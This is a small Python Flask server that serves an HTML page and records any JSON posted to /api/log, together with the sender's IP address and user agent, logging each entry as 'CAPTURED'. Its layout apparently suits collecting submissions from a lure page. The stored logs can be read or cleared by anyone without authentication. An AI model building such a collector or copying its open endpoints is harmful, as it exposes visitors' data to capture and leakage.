import json
import logging
import os
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, 'logs.json')
logging.basicConfig(level=logging.INFO)

def load_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return []
    return []

def save_logs(logs):
    with open(LOG_FILE, 'w', encoding='utf-8') as f:
        json.dump(logs, f, indent=4)

@app.route('/')
def index():
    html_files = [f for f in os.listdir(BASE_DIR) if f.endswith('.html')]
    if not html_files:
        return "No HTML found", 500
    return send_from_directory(BASE_DIR, html_files[0])

@app.route('/<path:path>')
def serve_static(path):
    full_path = os.path.join(BASE_DIR, path)
    if os.path.exists(full_path):
        return send_from_directory(BASE_DIR, path)
    return "Not Found", 404

@app.route('/api/log', methods=['POST'])
def log_data():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        log_entry = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "ip_address": request.remote_addr,
            "user_agent": request.headers.get('User-Agent'),
            "payload": data
        }
        
        logs = load_logs()
        logs.append(log_entry)
        save_logs(logs)
        
        logging.info(f"CAPTURED: {data}")
        return jsonify({"status": "success", "recorded": True}), 200
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    return jsonify(load_logs())

@app.route('/api/logs/clear', methods=['POST'])
def clear_logs():
    save_logs([])
    return jsonify({"status": "cleared"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5502)
